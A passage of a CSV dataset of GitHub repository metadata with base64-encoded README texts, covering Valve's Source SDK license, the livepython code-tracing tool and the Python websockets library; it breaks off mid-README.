name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
REsgQ29weXJpZ2h0KGMpIFZhbHZlIENvcnAuICAKClRISVMgRE9DVU1FTlQg
REVTQ1JJQkVTIEEgQ09OVFJBQ1QgQkVUV0VFTiBZT1UgQU5EIFZBTFZFIApD
T1JQT1JBVElPTiAoIlZhbHZlIikuICBQTEVBU0UgUkVBRCBJVCBCRUZPUkUg
RE9XTkxPQURJTkcgT1IgVVNJTkcgClRIRSBTT1VSQ0UgRU5HSU5FIFNESyAo
IlNESyIpLiBCWSBET1dOTE9BRElORyBBTkQvT1IgVVNJTkcgVEhFIApTT1VS
Q0UgRU5HSU5FIFNESyBZT1UgQUNDRVBUIFRISVMgTElDRU5TRS4gSUYgWU9V
IERPIE5PVCBBR1JFRSBUTyAKVEhFIFRFUk1TIE9GIFRISVMgTElDRU5TRSBQ
TEVBU0UgRE9O4oCZVCBET1dOTE9BRCBPUiBVU0UgVEhFIFNESy4gIAoKICBZ
b3UgbWF5LCBmcmVlIG9mIGNoYXJnZSwgZG93bmxvYWQgYW5kIHVzZSB0aGUg
U0RLIHRvIGRldmVsb3AgYSBtb2RpZmllZCBWYWx2ZSBnYW1lIApydW5uaW5n
IG9uIHRoZSBTb3VyY2UgZW5naW5lLiAgWW91IG1heSBkaXN0cmlidXRlIHlv
dXIgbW9kaWZpZWQgVmFsdmUgZ2FtZSBpbiBzb3VyY2UgYW5kIApvYmplY3Qg
Y29kZSBmb3JtLCBidXQgb25seSBmb3IgZnJlZS4gVGVybXMgb2YgdXNlIGZv
ciBWYWx2ZSBnYW1lcyBhcmUgZm91bmQgaW4gdGhlIFN0ZWFtIApTdWJzY3Jp
YmVyIEFncmVlbWVudCBsb2NhdGVkIGhlcmU6IGh0dHA6Ly9zdG9yZS5zdGVh
bXBvd2VyZWQuY29tL3N1YnNjcmliZXJfYWdyZWVtZW50LyAKCiAgWW91IG1h
eSBjb3B5LCBtb2RpZnksIGFuZCBkaXN0cmlidXRlIHRoZSBTREsgYW5kIGFu
eSBtb2RpZmljYXRpb25zIHlvdSBtYWtlIHRvIHRoZSAKU0RLIGluIHNvdXJj
ZSBhbmQgb2JqZWN0IGNvZGUgZm9ybSwgYnV0IG9ubHkgZm9yIGZyZWUuICBB
bnkgZGlzdHJpYnV0aW9uIG9mIHRoaXMgU0RLIG11c3QgCmluY2x1ZGUgdGhp
cyBMSUNFTlNFIGZpbGUgYW5kIHRoaXJkcGFydHlsZWdhbG5vdGljZXMudHh0
LiAgCiAKICBBbnkgZGlzdHJpYnV0aW9uIG9mIHRoZSBTREsgb3IgYSBzdWJz
dGFudGlhbCBwb3J0aW9uIG9mIHRoZSBTREsgbXVzdCBpbmNsdWRlIHRoZSBh
Ym92ZSAKY29weXJpZ2h0IG5vdGljZSBhbmQgdGhlIGZvbGxvd2luZzogCgog
ICAgRElTQ0xBSU1FUiBPRiBXQVJSQU5USUVTLiAgVEhFIFNPVVJDRSBTREsg
QU5EIEFOWSAKICAgIE9USEVSIE1BVEVSSUFMIERPV05MT0FERUQgQlkgTElD
RU5TRUUgSVMgUFJPVklERUQgCiAgICAiQVMgSVMiLiAgVkFMVkUgQU5EIElU
UyBTVVBQTElFUlMgRElTQ0xBSU0gQUxMIAogICAgV0FSUkFOVElFUyBXSVRI
IFJFU1BFQ1QgVE8gVEhFIFNESywgRUlUSEVSIEVYUFJFU1MgCiAgICBPUiBJ
TVBMSUVELCBJTkNMVURJTkcsIEJVVCBOT1QgTElNSVRFRCBUTywgSU1QTElF
RCAKICAgIFdBUlJBTlRJRVMgT0YgTUVSQ0hBTlRBQklMSVRZLCBOT04tSU5G
UklOR0VNRU5ULCAKICAgIFRJVExFIEFORCBGSVRORVNTIEZPUiBBIFBBUlRJ
Q1VMQVIgUFVSUE9TRS4gIAoKICAgIExJTUlUQVRJT04gT0YgTElBQklMSVRZ
LiAgSU4gTk8gRVZFTlQgU0hBTEwgVkFMVkUgT1IgCiAgICBJVFMgU1VQUExJ
RVJTIEJFIExJQUJMRSBGT1IgQU5ZIFNQRUNJQUwsIElOQ0lERU5UQUwsIAog
ICAgSU5ESVJFQ1QsIE9SIENPTlNFUVVFTlRJQUwgREFNQUdFUyBXSEFUU09F
VkVSIAogICAgKElOQ0xVRElORywgV0lUSE9VVCBMSU1JVEFUSU9OLCBEQU1B
R0VTIEZPUiBMT1NTIE9GIAogICAgQlVTSU5FU1MgUFJPRklUUywgQlVTSU5F
U1MgSU5URVJSVVBUSU9OLCBMT1NTIE9GIAogICAgQlVTSU5FU1MgSU5GT1JN
QVRJT04sIE9SIEFOWSBPVEhFUiBQRUNVTklBUlkgTE9TUykgCiAgICBBUklT
SU5HIE9VVCBPRiBUSEUgVVNFIE9GIE9SIElOQUJJTElUWSBUTyBVU0UgVEhF
IAogICAgRU5HSU5FIEFORC9PUiBUSEUgU0RLLCBFVkVOIElGIFZBTFZFIEhB
UyBCRUVOIAogICAgQURWSVNFRCBPRiBUSEUgUE9TU0lCSUxJVFkgT0YgU1VD
SCBEQU1BR0VTLiAgCiAKICAgICAgIApJZiB5b3Ugd291bGQgbGlrZSB0byB1
c2UgdGhlIFNESyBmb3IgYSBjb21tZXJjaWFsIHB1cnBvc2UsIHBsZWFzZSBj
b250YWN0IFZhbHZlIGF0IApzb3VyY2VlbmdpbmVAdmFsdmVzb2Z0d2FyZS5j
b20uCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'livepython',105598718,b'Visually trace Python code in real-time.',b'JavaScript',10,2395,,2395,False,b'https://api.github.com/repos/agermanidis/livepython/forks',"IVtdKGh0dHBzOi8vaS5pbWd1ci5jb20vR004dnJDei5wbmcpCiFbXShodHRw
czovL2kuaW1ndXIuY29tLzM2b0VoM1IuZ2lmKQoKIyMgTGl2ZXB5dGhvbiAK
IyMjIFdhdGNoIHlvdXIgUHl0aG9uIHJ1biBsaWtlIGEgbW92aWUuCgojIyMj
IyBOT1RFOiBMaXZlcHl0aG9uIGlzIGFscGhhIHNvZnR3YXJlLiBJdCBkb2Vz
bid0IGhhbmRsZSBhIGxvdCBvZiBlZGdlIGNhc2VzIGFuZCBmZWF0dXJlcyBt
YXkgY2hhbmdlLgoKTGl2ZXB5dGhvbiBpcyBhIGRlc2t0b3AgYXBwIHRoYXQg
bGV0cyB5b3UgdmlzdWFsbHkgdHJhY2UsIGluIHJlYWwtdGltZSwgdGhlIGV4
ZWN1dGlvbiBvZiBhIFB5dGhvbiBwcm9ncmFtLiBJbiBhZGRpdGlvbiwgaXQg
Y2FuIHRyYWNrIGNoYW5nZXMgaW4gZ2xvYmFsIGFuZCBsb2NhbCB2YXJpYWJs
ZXMgYXMgeW91ciBwcm9ncmFtIGlzIHJ1bm5pbmcuIExpdmVweXRob24gaXMg
bWVhbnQgdG8gZ2l2ZSB5b3UgYSBxdWljayBncmFzcCBvZiBhIHByb2dyYW0n
cyBleGVjdXRpb24gZmxvdy4gSXQncyBsZXNzIG1lc3N5IHRoYW4gc3ByaW5r
bGluZyBwcmludCBzdGF0ZW1lbnRzIHRocm91Z2hvdXQgeW91ciBjb2RlIGFu
ZCBzaW1wbGVyIHRvIHVzZSB0aGFuIGRlYnVnZ2Vycy9wcm9maWxlcnMuIAoK
TGl2ZXB5dGhvbiBjYW4gYmUgbGF1bmNoZWQgZnJvbSB0aGUgY29tbWFuZC1s
aW5lIGFzIGVhc2lseSBhczoKCiAgICBsaXZlcHl0aG9uIFtwcm9ncmFtXSBb
YXJncy4uLl0KCioqQ29udHJvbHM6KioKClNQQUNFOiBQbGF5L1BhdXNlIHRo
ZSBwcm9ncmFtLgoKTGVmdC9SaWdodCBBcnJvdzogQ2hhbmdlIHNwZWVkIG9m
IGV4ZWN1dGlvbi4KClY6IE9wZW4vQ2xvc2UgVmFyaWFibGUgSW5zcGVjdG9y
LgoKIyMjIENvbXBhdGliaWxpdHkKCnwgKipQeXRob24gVmVyc2lvbioqIHwg
KipDb21wYXRpYmxlPyoqIHwKfC0tLS0tLS0tLS0tfC0tLS0tLS0tLS0tLS0t
LXwKfCAzLjYgICAgICAgfCDinIUgICAgICAgICAgICAgfAp8IDMuNSAgICAg
ICB8IOKchSAgICAgICAgICAgICB8CnwgMi43ICAgICAgIHwg4pyFICAgICAg
ICAgICAgIHwKfCAyLjYgICAgICAgfCDinYwgICAgICAgICAgICAgfAoKIyMj
IEluc3RhbGxhdGlvbgoKICAgIG5wbSBpbnN0YWxsIGxpdmVweXRob24gLWcK
CiMjIyBEZXZlbG9wbWVudAoKPGltZyBzcmM9Imh0dHBzOi8vaS5pbWd1ci5j
b20vUVdjN01MVC5wbmciIHdpZHRoPTUwMD48L2ltZz4KCkxpdmVweXRob24g
aGFzIDMgbWFpbiBjb21wb25lbnRzOiAKCiogYSBQeXRob24gW3RyYWNlcl0o
aHR0cHM6Ly9naXRodWIuY29tL2FnZXJtYW5pZGlzL2xpdmVweXRob24vYmxv
Yi9tYXN0ZXIvdHJhY2VyLnB5KSB0aGF0IHVzZXMgYHN5cy5zZXR0cmFjZSgp
YCB0byBpbnRlcmNlcHQgZXZlcnkgbGluZSBvZiB5b3VyIHByb2dyYW0gYXMg
aXQncyBiZWluZyBldmFsdWF0ZWQKKiBhbiBbRWxlY3Ryb24gYXBwXShodHRw
czovL2dpdGh1Yi5jb20vYWdlcm1hbmlkaXMvbGl2ZXB5dGhvbi9ibG9iL21h
c3Rlci9tYWluLmpzKSB0aGF0IGlzIHJlc3BvbnNpYmxlIGZvciB0aGUgcmVu
ZGVyaW5nIHRoZSBMaXZlcHl0aG9uIGZyb250ZW5kCiogYSBub2RlLmpzIFtn
YXRld2F5IHNjcmlwdF0oaHR0cHM6Ly9naXRodWIuY29tL2FnZXJtYW5pZGlz
L2xpdmVweXRob24vYmxvYi9tYXN0ZXIvYmluL2xpdmVweXRob24pIHRoYXQg
bWFuYWdlcyBjb21tdW5pY2F0aW9uIGJldHdlZW4gdGhlIGZyb250ZW5kIGFu
ZCB0aGUgdHJhY2VyIAoKSWYgeW91IHdhbnQgdG8gbWFrZSBjaGFuZ2VzIHRv
IExpdmVweXRob24sIHlvdSB3aWxsIG5lZWQgdG8gcnVuIFt3ZWJwYWNrXSho
dHRwczovL3dlYnBhY2suanMub3JnLyk6CgogICAgd2VicGFjawoKVGhlbiB5
b3UgY2FuIHRlc3QgeW91ciBidWlsdCB2ZXJzaW9uIG9mIGxpdmVweXRob24g
YnkgcnVubmluZzoKCiAgICBiaW4vbGl2ZXB5dGhvbiBbeW91ciBweXRob24g
cHJvZ3JhbV0KCiMjIyBMaWNlbnNlCgpNSVQK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'websockets',9113587,b'Library for building WebSocket servers and clients in Python',b'Python',32,2395,,2395,False,b'https://api.github.com/repos/aaugustin/websockets/forks',"Li4gaW1hZ2U6OiBsb2dvL2hvcml6b250YWwuc3ZnCiAgIDp3aWR0aDogNDgw
cHgKICAgOmFsdDogd2Vic29ja2V0cwoKfHJ0ZHwgfHB5cGktdnwgfHB5cGkt
cHl2ZXJzaW9uc3wgfHB5cGktbHwgfHB5cGktd2hlZWx8IHxjaXJjbGVjaXwg
fGNvZGVjb3Z8CgouLiB8cnRkfCBpbWFnZTo6IGh0dHBzOi8vcmVhZHRoZWRv
Y3Mub3JnL3Byb2plY3RzL3dlYnNvY2tldHMvYmFkZ2UvP3ZlcnNpb249bGF0
ZXN0CiAgIDp0YXJnZXQ6IGh0dHBzOi8vd2Vic29ja2V0cy5yZWFkdGhlZG9j
cy5pby8KCi4uIHxweXBpLXZ8IGltYWdlOjogaHR0cHM6Ly9pbWcuc2hpZWxk
cy5pby9weXBpL3Yvd2Vic29ja2V0cy5zdmcKICAgIDp0YXJnZXQ6IGh0dHBz
Oi8vcHlwaS5weXRob24ub3JnL3B5cGkvd2Vic29ja2V0cwoKLi4gfHB5cGkt
cHl2ZXJzaW9uc3wgaW1hZ2U6OiBodHRwczovL2ltZy5zaGllbGRzLmlvL3B5
cGkvcHl2ZXJzaW9ucy93ZWJzb2NrZXRzLnN2ZwogICAgOnRhcmdldDogaHR0
cHM6Ly9weXBpLnB5dGhvbi5vcmcvcHlwaS93ZWJzb2NrZXRzCgouLiB8cHlw
aS1sfCBpbWFnZTo6IGh0dHBzOi8vaW1nLnNoaWVsZHMuaW8vcHlwaS9sL3dl
YnNvY2tldHMuc3ZnCiAgICA6dGFyZ2V0OiBodHRwczovL3B5cGkucHl0aG9u
Lm9yZy9weXBpL3dlYnNvY2tldHMKCi4uIHxweXBpLXdoZWVsfCBpbWFnZTo6
IGh0dHBzOi8vaW1nLnNoaWVsZHMuaW8vcHlwaS93aGVlbC93ZWJzb2NrZXRz
LnN2ZwogICAgOnRhcmdldDogaHR0cHM6Ly9weXBpLnB5dGhvbi5vcmcvcHlw
aS93ZWJzb2NrZXRzCgouLiB8Y2lyY2xlY2l8IGltYWdlOjogaHR0cHM6Ly9p
bWcuc2hpZWxkcy5pby9jaXJjbGVjaS9wcm9qZWN0L2dpdGh1Yi9hYXVndXN0
aW4vd2Vic29ja2V0cy5zdmcKICAgOnRhcmdldDogaHR0cHM6Ly9jaXJjbGVj
aS5jb20vZ2gvYWF1Z3VzdGluL3dlYnNvY2tldHMKCi4uIHxjb2RlY292fCBp
bWFnZTo6IGh0dHBzOi8vY29kZWNvdi5pby9naC9hYXVndXN0aW4vd2Vic29j
a2V0cy9icmFuY2gvbWFzdGVyL2dyYXBoL2JhZGdlLnN2ZwogICAgOnRhcmdl
dDogaHR0cHM6Ly9jb2RlY292LmlvL2doL2FhdWd1c3Rpbi93ZWJzb2NrZXRz
CgpXaGF0IGlzIGBgd2Vic29ja2V0c2BgPwotLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLQoKYGB3ZWJzb2NrZXRzYGAgaXMgYSBsaWJyYXJ5IGZvciBidWlsZGlu
ZyBXZWJTb2NrZXQgc2VydmVyc18gYW5kIGNsaWVudHNfIGluClB5dGhvbiB3
aXRoIGEgZm9jdXMgb24gY29ycmVjdG5lc3MgYW5kIHNpbXBsaWNpdHkuCgou
LiBfc2VydmVyczogaHR0cHM6Ly9naXRodWIuY29tL2FhdWd1c3Rpbi93ZWJz
b2NrZXRzL2Jsb2IvbWFzdGVyL2V4YW1wbGUvc2VydmVyLnB5Ci4uIF9jbGll
bnRzOiBodHRwczovL2dpdGh1Yi5jb20vYWF1Z3VzdGluL3dlYnNvY2tldHMv
YmxvYi9tYXN0ZXIvZXhhbXBsZS9jbGllbnQucHkKCkJ1aWx0IG9uIHRvcCBv
ZiBgYGFzeW5jaW9gYCwgUHl0aG9uJ3Mgc3RhbmRhcmQgYXN5bmNocm9ub3Vz
IEkvTyBmcmFtZXdvcmssIGl0CnByb3ZpZGVzIGFuIGVsZWdhbnQgY29yb3V0
aW5lLWJhc2VkIEFQSS4KCmBEb2N1bWVudGF0aW9uIGlzIGF2YWlsYWJsZSBv
biBSZWFkIHRoZSBEb2NzLiA8aHR0cHM6Ly93ZWJzb2NrZXRzLnJlYWR0aGVk
b2NzLmlvLz5gXwoKSGVyZSdzIGhvdyBhIGNsaWVudCBzZW5kcyBhbmQgcmVj
ZWl2ZXMgbWVzc2FnZXM6CgouLiBjb3B5LXBhc3RlZCBiZWNhdXNlIEdpdEh1
YiBkb2Vzbid0IHN1cHBvcnQgdGhlIGluY2x1ZGUgZGlyZWN0aXZlCgouLiBj
b2RlOjogcHl0aG9uCgogICAgIyEvdXNyL2Jpbi9lbnYgcHl0aG9uCgogICAg
aW1wb3J0IGFzeW5jaW8KICAgIGltcG9ydCB3ZWJzb2NrZXRzCgogICAgYXN5
bmMgZGVmIGhlbGxvKHVyaSk6CiAgICAgICAgYXN5bmMgd2l0aCB3ZWJzb2Nr
ZXRzLmNvbm5lY3QodXJpKSBhcyB3ZWJzb2NrZXQ6CiAgICAgICAgICAgIGF3
YWl0IHdlYnNvY2tldC5zZW5kKCJIZWxsbyB3b3JsZCEiKQogICAgICAgICAg
ICBhd2FpdCB3ZWJzb2NrZXQucmVjdigpCgogICAgYXN5bmNpby5nZXRfZXZl
bnRfbG9vcCgpLnJ1bl91bnRpbF9jb21wbGV0ZSgKICAgICAgICBoZWxsbygn
d3M6Ly9sb2NhbGhvc3Q6ODc2NScpKQoKQW5kIGhlcmUncyBhbiBlY2hvIHNl
cnZlcjoKCi4uIGNvZGU6OiBweXRob24KCiAgICAjIS91c3IvYmluL2VudiBw
eXRob24KCiAgICBpbXBvcnQgYXN5bmNpbwogICAgaW1wb3J0IHdlYnNvY2tl
dHMKCiAgICBhc3luYyBkZWYgZWNobyh3ZWJzb2NrZXQsIHBhdGgpOgogICAg
ICAgIGFzeW5jIGZvciBtZXNzYWdlIGluIHdlYnNvY2tldDoKICAgICAgICAg
ICAgYXdhaXQgd2Vic29ja2V0LnNlbmQobWVzc2FnZSkKCiAgICBhc3luY2lv
LmdldF9ldmVudF9sb29wKCkucnVuX3VudGlsX2NvbXBsZXRlKAogICAgICAg
IHdlYnNvY2tldHMuc2VydmUoZWNobywgJ2xvY2FsaG9zdCcsIDg3NjUpKQog
ICAgYXN5bmNpby5nZXRfZXZlbnRfbG9vcCgpLnJ1bl9mb3JldmVyKCkKCkRv
ZXMgdGhhdCBsb29rIGdvb2Q/CgpgR2V0IHN0YXJ0ZWQgd2l0aCB0aGUgdHV0
b3JpYWwhIDxodHRwczovL3dlYnNvY2tldHMucmVhZHRoZWRvY3MuaW8vZW4v
c3RhYmxlL2ludHJvLmh0bWw+YF8KCi4uIHJhdzo6IGh0bWwKCiAgICA8aHI+
CiAgICA8aW1nIGFsaWduPSJsZWZ0IiBoZWlnaHQ9IjE1MCIgd2lkdGg9IjE1
MCIgc3JjPSJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYWF1
Z3VzdGluL3dlYnNvY2tldHMvbWFzdGVyL2xvZ28vdGlkZWxpZnQucG5nIj4K
ICAgIDxoMyBhbGlnbj0iY2VudGVyIj48aT53ZWJzb2NrZXRzIGZvciBlbnRl
cnByaXNlPC9pPjwvaDM+CiAgICA8cCBhbGlnbj0iY2VudGVyIj48aT5BdmFp
bGFibGUgYXMgcGFydCBvZiB0aGUgVGlkZWxpZnQgU3Vic2NyaXB0aW9uPC9p
PjwvcD4KICAgIDxwIGFsaWduPSJjZW50ZXIiPjxpPlRoZSBtYWludGFpbmVy
cyBvZiB3ZWJzb2NrZXRzIGFuZCB0aG91c2FuZHMgb2Ygb3RoZXIgcGFja2Fn
ZXMgYXJlIHdvcmtpbmcgd2l0aCBUaWRlbGlmdCB0byBkZWxpdmVyIGNvbW1l
cmNpYWwgc3VwcG9ydCBhbmQgbWFpbnRlbmFuY2UgZm9yIHRoZSBvcGVuIHNv
dXJjZSBkZXBlbmRlbmNpZXMgeW91IHVzZSB0byBidWlsZCB5b3VyIGFwcGxp
Y2F0aW9ucy4gU2F2ZSB0aW1lLCByZWR1Y2UgcmlzaywgYW5kIGltcHJvdmUg
Y29kZSBoZWFsdGgsIHdoaWxlIHBheWluZyB0aGUgbWFpbnRhaW5lcnMgb2Yg
dGhlIGV4YWN0IGRlcGVuZGVuY2llcyB5b3UgdXNlLiA8YSBocmVmPSJodHRw
czovL3RpZGVsaWZ0LmNvbS9zdWJzY3JpcHRpb24vcGtnL3B5cGktd2Vic29j
a2V0cz91dG1fc291cmNlPXB5cGktd2Vic29ja2V0cyZ1dG1fbWVkaXVtPXJl
ZmVycmFsJnV0bV9jYW1wYWlnbj1yZWFkbWUiPkxlYXJuIG1vcmUuPC9hPjwv
aT48L3A+CiAgICA8aHI+CiAgICA8cD4oSWYgeW91IGNvbnRyaWJ1dGUgdG8g
PGNvZGU+d2Vic29ja2V0czwvY29kZT4gYW5kIHdvdWxkIGxpa2UgdG8gYmVj
b21lIGFuIG9mZmljaWFsIHN1cHBvcnQgcHJvdmlkZXIsIDxhIGhyZWY9Imh0
dHBzOi8vZnJhY3RhbGlkZWFzLmNvbS8iPmxldCBtZSBrbm93PC9hPi4pPC9w
PgoKV2h5IHNob3VsZCBJIHVzZSBgYHdlYnNvY2tldHNgYD8KLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KClRoZSBkZXZlbG9wbWVudCBvZiBg
YHdlYnNvY2tldHNgYCBpcyBzaGFwZWQgYnkgZm91ciBwcmluY2lwbGVzOgoK
MS4gKipTaW1wbGljaXR5Kio6IGFsbCB5b3UgbmVlZCB0byB1bmRlcnN0YW5k
IGlzIGBgbXNnID0gYXdhaXQgd3MucmVjdigpYGAgYW5kCiAgIGBgYXdhaXQg
d3Muc2VuZChtc2cpYGA7IGBgd2Vic29ja2V0c2BgIHRha2VzIGNhcmUgb2Yg
bWFuYWdpbmcgY29ubmVjdGlvbnMKICAgc28geW91IGNhbiBmb2N1cyBvbiB5
b3VyIGFwcGxpY2F0aW9uLgoKMi4gKipSb2J1c3RuZXNzKio6IGBgd2Vic29j
a2V0c2BgIGlzIGJ1aWx0IGZvciBwcm9kdWN0aW9uOyBmb3IgZXhhbXBsZSBp
dCB3YXMKICAgdGhlIG9ubHkgbGlicmFyeSB0byBgaGFuZGxlIGJhY2twcmVz
c3VyZSBjb3JyZWN0bHlgXyBiZWZvcmUgdGhlIGlzc3VlCiAgIGJlY2FtZSB3
aWRlbHkga25vd24gaW4gdGhlIFB5dGhvbiBjb21tdW5pdHkuCgozLiAqKlF1
YWxpdHkqKjogYGB3ZWJzb2NrZXRzYGAgaXMgaGVhdmlseSB0ZXN0ZWQuIENv
bnRpbnVvdXMgaW50ZWdyYXRpb24gZmFpbHMKICAgdW5kZXIgMTAwJSBicmFu
Y2ggY292ZXJhZ2UuIEFsc28gaXQgcGFzc2VzIHRoZSBpbmR1c3RyeS1zdGFu
ZGFyZCBgQXV0b2JhaG4KICAgVGVzdHN1aXRlYF8uCgo0LiAqKlBlcmZvcm1h
bmNlKio6IG1lbW9yeSB1c2UgaXMgY29uZmlndXJhYmxlLiBBbiBleHRlbnNp
b24gd3JpdHRlbiBpbiBDCiAgIGFjY2VsZXJhdGVzIGV4cGVuc2l2ZSBvcGVy
YXRpb25zLiBJdCdzIHByZS1jb21waWxlZCBmb3IgTGludXgsIG1hY09TIGFu
ZAogICBXaW5kb3dzIGFuZCBwYWNrYWdlZCBpbiB0aGUgd2hlZWwgZm9ybWF0
IGZvciBlYWNoIHN5c3RlbSBhbmQgUHl0aG9uIHZlcnNpb24uCgpEb2N1bWVu
dGF0aW9uIGlzIGEgZmlyc3QgY2xhc3MgY29uY2VybiBpbiB0aGUgcHJvamVj
dC4gSGVhZCBvdmVyIHRvIGBSZWFkIHRoZQpEb2NzYF8gYW5kIHNlZSBmb3Ig
eW91cnNlbGYuCgouLiBfUmVhZCB0aGUgRG9jczogaHR0cHM6Ly93ZWJzb2Nr
ZXRzLnJlYWR0aGVkb2NzLmlvLwouLiBfaGFuZGxlIGJhY2twcmVzc3VyZSBj
b3JyZWN0bHk6IGh0dHBzOi8vdm9ycHVzLm9yZy9ibG9nL3NvbWUtdGhvdWdo
dHMtb24tYXN5bmNocm9ub3VzLWFwaS1kZXNpZ24taW4tYS1wb3N0LWFzeW5j
YXdhaXQtd29ybGQvI3dlYnNvY2tldC1zZXJ2ZXJzCi4uIF9BdXRvYmFobiBU
ZXN0c3VpdGU6IGh0dHBzOi8vZ2l0aHViLmNvbS9hYXVndXN0aW4vd2Vic29j
a2V0cy9ibG9iL21hc3Rlci9jb21wbGlhbmNlL1JFQURNRS5yc3QKCldoeSBz
aG91bGRuJ3QgSSB1c2UgYGB3ZWJzb2NrZXRzYGA/Ci0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tCgoqIElmIHlvdSBwcmVmZXIgY2FsbGJh
Y2tzIG92ZXIgY29yb3V0aW5lczogYGB3ZWJzb2NrZXRzYGAgd2FzIGNyZWF0
ZWQgdG8KICBwcm92aWRlIHRoZSBiZXN0IGNvcm91dGluZS1iYXNlZCBBUEkg
dG8gbWFuYWdlIFdlYlNvY2tldCBjb25uZWN0aW9ucyBpbgogIFB5dGhvbi4g
UGljayBhbm90aGVyIGxpYnJhcnkgZm9yIGEgY2FsbGJhY2stYmFzZWQgQVBJ
LgoqIElmIHlvdSdyZSBsb29raW5nIGZvciBhIG1peGVkIEhUVFAgLyBXZWJT
b2NrZXQgbGlicmFyeTogYGB3ZWJzb2NrZXRzYGAgYWltcwogIGF0IGJlaW5n
IGFuIGV4Y2VsbGVudCBpbXBsZW1lbnRhdGlvbiBvZiA6cmZjOmA2NDU1YDog
VGhlIFdlYlNvY2tldCBQcm90b2NvbAogIGFuZCA6cmZjOmA3NjkyYDogQ29t
cHJlc3Npb24gRXh0ZW5zaW9ucyBmb3IgV2ViU29ja2V0LiBJdHMgc3VwcG9y
dCBmb3IgSFRUUAogIGlzIG1pbmltYWwg4oCUIGp1c3QgZW5vdWdoIGZvciBh
IEhUVFAgaGVhbHRoIGNoZWNrLgoqIElmIHlvdSB3YW50IHRvIHVzZSBQeXRo
b24gMjogYGB3ZWJzb2NrZXRzYGAgYnVpbGRzIHVwb24gYGBhc3luY2lvYGAg
d2hpY2gKICBvbmx5IHdvcmtzIG9uIFB5dGhvbiAzLiBgYHdlYnNvY2tldHNg
YCByZXF1aXJlcyBQeXRob24g4omlIDMuNi4xLgoKV2hhdCBlbHNlPwotLS0t
LS0tLS0tCgpCdWcgcmVwb3J0cywgcGF0Y2hlcyBhbmQgc3VnZ2VzdGlvbnMg
